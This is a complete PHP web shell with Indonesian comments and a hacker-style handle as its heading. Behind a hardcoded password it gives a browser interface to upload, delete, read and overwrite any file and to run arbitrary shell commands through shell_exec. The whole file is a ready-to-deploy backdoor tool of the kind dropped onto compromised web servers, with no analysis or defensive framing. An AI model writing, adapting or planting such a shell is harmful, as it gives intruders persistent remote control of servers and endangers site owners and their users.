<?php
session_start();

// Konfigurasi password untuk login
$password = "TamaaGanteng"; // Ganti dengan password yang lebih kuat

// Cek apakah sudah login
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<form method="POST"><input type="password" name="password" placeholder="Enter Password" required><input type="submit" value="Login"></form>';
        exit;
    }
}

// Fungsi Upload File
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "<script>alert('File uploaded!');</script>";
}

// Fungsi Hapus File
if (isset($_GET['delete'])) {
    if (file_exists($_GET['delete'])) {
        unlink($_GET['delete']);
        echo "<script>alert('File deleted!');</script>";
    } else {
        echo "<script>alert('File not found!');</script>";
    }
}

// Fungsi Eksekusi Perintah Shell
$output = "";
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd'] . " 2>&1");
}

// Fungsi Edit File
$fileContent = "";
if (isset($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    if (file_exists($fileToEdit) && is_readable($fileToEdit)) {
        $fileContent = file_get_contents($fileToEdit);
    } else {
        echo "<script>alert('File not found or unreadable! ');</script>";
    }
}

// Fungsi Simpan File yang Telah Diedit
if (isset($_POST['saveFile']) && isset($_POST['fileName'])) {
    $fileName = $_POST['fileName'];
    $newContent = $_POST['fileContent'];
    file_put_contents($fileName, $newContent);
    echo "<script>alert('File saved successfully! ');</script>";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tamaa</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #00bcd4, #8e24aa);
            color: #fff;
            text-align: center;
            padding: 40px;
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        form {
            margin: 10px auto;
            max-width: 400px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
        }
        input, button, textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #444;
            color: #fff;
            border: 1px solid #555;
            border-radius: 8px;
            font-size: 16px;
            transition: background 0.3s ease-in-out;
        }
        input[type="submit"], button {
            background: #28a745;
            cursor: pointer;
        }
        input[type="submit"]:hover, button:hover {
            background: #218838;
        }
        pre {
            background: #111;
            padding: 15px;
            border-radius: 8px;
            text-align: left;
            overflow-x: auto;
            max-width: 80%;
            margin: 20px auto;
            min-height: 100px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        textarea {
            height: 200px;
            resize: vertical;
        }
        h2 {
            font-size: 36px;
            margin-bottom: 20px;
        }
        h3 {
            font-size: 24px;
        }
    </style>
</head>
<body>

    <div>
        <h2>./1tsM3T4maa</h2>

        <!-- Form Upload -->
        <form method="POST" enctype="multipart/form-data">
            <h3>Upload File</h3>
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>

        <!-- Form Delete File -->
        <form method="GET">
            <h3>Delete File</h3>
            <input type="text" name="delete" placeholder="Nama file">
            <input type="submit" value="Delete">
        </form>

        <!-- Form Edit File -->
        <form method="GET">
            <h3>Edit File</h3>
            <input type="text" name="edit" placeholder="Nama file">
            <input type="submit" value="Edit">
        </form>

        <?php if (isset($_GET['edit']) && file_exists($_GET['edit'])): ?>
        <!-- Form Edit File -->
        <form method="POST">
            <h3>Editing: <?php echo htmlspecialchars($fileToEdit); ?></h3>
            <input type="hidden" name="fileName" value="<?php echo htmlspecialchars($fileToEdit); ?>">
            <textarea name="fileContent"><?php echo htmlspecialchars($fileContent); ?></textarea>
            <input type="submit" name="saveFile" value="Save">
        </form>
        <?php endif; ?>

        <!-- Terminal -->
        <form method="POST">
            <h3>Terminal Console</h3>
            <input type="text" name="cmd" placeholder="Masukkan Perintah">
            <button type="submit">Run</button>
        </form>

        <!-- Kotak Output Terminal -->
        <pre><?php echo htmlspecialchars($output); ?></pre>
    </div>

</body>
</html>